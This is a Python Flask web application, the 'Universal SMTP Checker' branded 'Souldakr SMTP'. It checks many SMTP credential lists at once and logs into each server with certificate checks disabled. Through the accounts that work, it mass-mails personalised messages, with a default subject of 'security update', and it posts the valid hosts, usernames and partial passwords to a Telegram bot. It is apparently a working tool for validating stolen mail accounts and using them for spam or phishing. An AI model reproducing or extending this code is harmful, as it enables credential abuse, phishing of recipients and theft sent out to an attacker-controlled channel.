from flask import Flask, render_template, request, jsonify
import smtplib
import ssl
import socket
import threading
import time
import json
import re
import random
import base64
from queue import Queue
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from email import encoders
import mimetypes

app = Flask(__name__)

# --- ESTADO GLOBAL DEL SERVICIO ---
checking_state = {
    'is_checking': False,
    'valid_count': 0,
    'invalid_count': 0,
    'total_count': 0,
    'checked_count': 0,
    'logs': [],
    'valid_smtps': [],
    'current_smtp': '',
    'start_time': 0
}

# --- FUNCIONES DE UTILIDAD ---

def log_message(message, type='info'):
    """Agregar mensaje al log global con límite de 500 entradas"""
    timestamp = time.strftime("%H:%M:%S")
    checking_state['logs'].append({'time': timestamp, 'message': message, 'type': type})
    if len(checking_state['logs']) > 500:
        checking_state['logs'] = checking_state['logs'][-500:]

def parse_smtp_line(line):
    """Convierte cualquier formato de SMTP a formato estándar: host|port|user|pass"""
    line = line.strip()
    if not line:
        return None
    
    try:
        # Formato con pipe: host|port|user|pass
        if '|' in line:
            parts = line.split('|')
            if len(parts) >= 4:
                return f"{parts[0].strip()}|{parts[1].strip()}|{parts[2].strip()}|{parts[3].strip()}"
        
        # Formato con @: user:pass@host:port
        if '@' in line and ':' in line:
            match = re.match(r'([^:]+):([^@]+)@([^:]+):(\d+)', line)
            if match:
                user, password, host, port = match.groups()
                return f"{host.strip()}|{port.strip()}|{user.strip()}|{password.strip()}"
        
        # Formato con dos puntos: host:port:user:pass
        if line.count(':') >= 3:
            parts = line.split(':')
            if len(parts) >= 4:
                return f"{parts[0]}|{parts[1]}|{parts[2]}|{parts[3]}"
                
    except Exception:
        return None
    
    return None

def personalize_content(content, recipient_email, smtp_host="", smtp_user="", counter=1, enable_personalization=True):
    """Personalizar contenido con variables dinámicas"""
    if not enable_personalization:
        return content
    
    try:
        if '@' in recipient_email:
            email_parts = recipient_email.split('@')
            email_name = email_parts[0]
            email_domain = email_parts[1]
            formatted_name = email_name.replace('.', ' ').title()
        else:
            email_name = recipient_email
            email_domain = ""
            formatted_name = recipient_email
        
        now = datetime.now()
        replacements = {
            '{email}': recipient_email,
            '{fecha}': now.strftime("%Y-%m-%d"),
            '{hora}': now.strftime("%H:%M:%S"),
            '{fecha_hora}': now.strftime("%Y-%m-%d %H:%M:%S"),
            '{nombre}': formatted_name,
            '{dominio}': email_domain,
            '{random_id}': ''.join(random.choices('0123456789ABCDEF', k=8)),
            '{dia}': now.strftime("%d"),
            '{mes}': now.strftime("%m"),
            '{año}': now.strftime("%Y"),
            '{timestamp}': str(int(now.timestamp())),
            '{contador}': str(counter),
            '{smtp_host}': smtp_host,
            '{smtp_user}': smtp_user,
            '{hora_12}': now.strftime("%I:%M:%S"),
            '{am_pm}': now.strftime("%p")
        }
        
        personalized = content
        for var, value in replacements.items():
            personalized = personalized.replace(var, value)
        return personalized
    except Exception:
        return content

def create_email_message(user, recipient, subject, body, counter=1, smtp_host="", sender_name="Souldakr SMTP", enable_personalization=True):
    """Crear mensaje de email con personalización"""
    try:
        formatted_sender = f'{sender_name} <{user}>'
        personalized_subject = personalize_content(subject, recipient, smtp_host, user, counter, enable_personalization)
        personalized_body = personalize_content(body, recipient, smtp_host, user, counter, enable_personalization)
        
        msg = MIMEMultipart('alternative')
        msg['From'] = formatted_sender
        msg['To'] = recipient
        msg['Subject'] = personalized_subject
        
        # Si el cuerpo tiene HTML, lo enviamos como HTML, si no, como texto plano
        if '<html>' in personalized_body.lower() or '<div' in personalized_body.lower() or '<p>' in personalized_body.lower():
            html_part = MIMEText(personalized_body, 'html', 'utf-8')
            msg.attach(html_part)
            text_fallback = re.sub(r'<[^>]+>', '', personalized_body)
            text_part = MIMEText(text_fallback, 'plain', 'utf-8')
            msg.attach(text_part)
        else:
            text_part = MIMEText(personalized_body, 'plain', 'utf-8')
            msg.attach(text_part)
        
        return msg
    except Exception as e:
        log_message(f"Error creando mensaje: {str(e)[:50]}", 'warning')
        msg = MIMEMultipart()
        msg['From'] = user
        msg['To'] = recipient
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        return msg

def test_smtp_connection(host, port, user, password, config):
    """Probar conexión SMTP y enviar emails si está configurado"""
    port = int(port)
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    methods_to_try = []
    if port == 465:
        methods_to_try = [('SSL', 465), ('STARTTLS', 587), ('STARTTLS', 25)]
    elif port == 587:
        methods_to_try = [('STARTTLS', 587), ('SSL', 465), ('STARTTLS', 25)]
    else:
        methods_to_try = [('STARTTLS', port), ('SSL', port)]

    for method_name, test_port in methods_to_try:
        server = None
        try:
            if method_name == 'SSL':
                server = smtplib.SMTP_SSL(host=host, port=test_port, timeout=10, context=context)
            else:
                server = smtplib.SMTP(host=host, port=test_port, timeout=10)
                server.starttls(context=context)
            
            server.login(user, password)
            checking_state['current_smtp'] = f"{host}:{port} | {user[:20]}..."
            
            # Enviar emails si está habilitado y hay destinatarios
            if config.get('send_test_email') and config.get('recipients'):
                recipients = [r.strip() for r in config['recipients'].split('\n') if r.strip() and '@' in r]
                subject = config.get('email_subject', 'Test Email')
                body = config.get('email_body', 'Email enviado desde Universal SMTP Checker')
                sender_name = config.get('sender_name', 'Souldakr SMTP')
                enable_personalization = config.get('enable_personalization', True)
                
                for i, recipient in enumerate(recipients, 1):
                    try:
                        msg = create_email_message(user, recipient, subject, body, i, host, sender_name, enable_personalization)
                        server.sendmail(user, recipient, msg.as_string())
                        log_message(f"  📤 Enviado a {recipient} (personalizado)", 'success')
                        time.sleep(0.3)
                    except Exception as email_error:
                        log_message(f"  ⚠️ Error enviando a {recipient}: {str(email_error)[:50]}", 'warning')
            
            server.noop()
            server.quit()
            return True, f"{method_name}:{test_port} - Conexión exitosa"
            
        except smtplib.SMTPAuthenticationError:
            if server:
                try: server.quit()
                except: pass
            return False, "Autenticación fallida"
        except Exception as e:
            if server:
                try: server.quit()
                except: pass
            continue
    
    return False, "No se pudo conectar"

def worker(queue, config):
    """Worker que procesa los SMTPs en hilos"""
    while not queue.empty() and checking_state['is_checking']:
        try:
            line_num, original_line = queue.get_nowait()
            smtp_standard = parse_smtp_line(original_line)
            
            if smtp_standard:
                parts = smtp_standard.split('|')
                if len(parts) == 4:
                    host, port, user, password = parts
                    if not port.isdigit():
                        port = '587'
                    
                    is_valid, message = test_smtp_connection(host, int(port), user, password, config)
                    
                    if is_valid:
                        checking_state['valid_count'] += 1
                        checking_state['valid_smtps'].append(smtp_standard)
                        log_message(f"[{line_num}] ✅ VÁLIDO: {host}:{port} | {user}", 'success')
                        
                        # Enviar a Telegram si está configurado
                        if config.get('telegram_token') and config.get('telegram_chat_id'):
                            telegram_msg = f"✅ <b>SMTP VÁLIDO</b>\n🌐 {host}:{port}\n👤 {user}\n🔑 {password[:15]}...\n📊 Válidos: {checking_state['valid_count']}"
                            try:
                                import requests
                                requests.post(f"https://api.telegram.org/bot{config['telegram_token']}/sendMessage", 
                                            data={"chat_id": config['telegram_chat_id'], "text": telegram_msg, "parse_mode": "HTML"}, timeout=5)
                            except: pass
                    else:
                        checking_state['invalid_count'] += 1
                        log_message(f"[{line_num}] ❌ INVÁLIDO: {host}:{port} | {message}", 'error')
                    
                    checking_state['checked_count'] += 1
            else:
                checking_state['invalid_count'] += 1
                log_message(f"[{line_num}] ⚠️ Formato no reconocido: {original_line[:50]}...", 'warning')
            
            queue.task_done()
            
        except Exception as e:
            log_message(f"[ERROR Worker] {str(e)[:50]}", 'error')
            queue.task_done()

# --- RUTAS DE FLASK ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start-check', methods=['POST'])
def start_check():
    data = request.json
    smtp_list = data.get('smtp_list', '')
    threads_count = int(data.get('threads', 10))
    config = {
        'send_test_email': data.get('send_test_email', False),
        'recipients': data.get('recipients', ''),
        'email_subject': data.get('email_subject', 'Actualización de Seguridad'),
        'email_body': data.get('email_body', 'Este es un correo de prueba.'),
        'sender_name': data.get('sender_name', 'Souldakr SMTP'),
        'enable_personalization': data.get('enable_personalization', True),
        'telegram_token': data.get('telegram_token', ''),
        'telegram_chat_id': data.get('telegram_chat_id', '')
    }
    
    if not smtp_list.strip():
        return jsonify({'error': 'La lista de SMTPs está vacía'}), 400
    
    checking_state.update({
        'is_checking': True, 'valid_count': 0, 'invalid_count': 0,
        'total_count': 0, 'checked_count': 0, 'logs': [], 'valid_smtps': [],
        'current_smtp': '', 'start_time': time.time()
    })
    
    lines = [line.strip() for line in smtp_list.split('\n') if line.strip()]
    checking_state['total_count'] = len(lines)
    
    queue = Queue()
    for i, line in enumerate(lines, 1):
        queue.put((i, line))
    
    def run_check():
        threads = []
        num_threads = min(threads_count, queue.qsize())
        for _ in range(num_threads):
            t = threading.Thread(target=worker, args=(queue, config))
            t.daemon = True
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        checking_state['is_checking'] = False
        log_message("✅ CHECKEO COMPLETADO", 'success')
    
    threading.Thread(target=run_check, daemon=True).start()
    return jsonify({'message': 'Checkeo iniciado', 'total': len(lines)})

@app.route('/status')
def status():
    return jsonify(checking_state)

@app.route('/stop-check', methods=['POST'])
def stop_check():
    checking_state['is_checking'] = False
    return jsonify({'message': 'Detenido'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
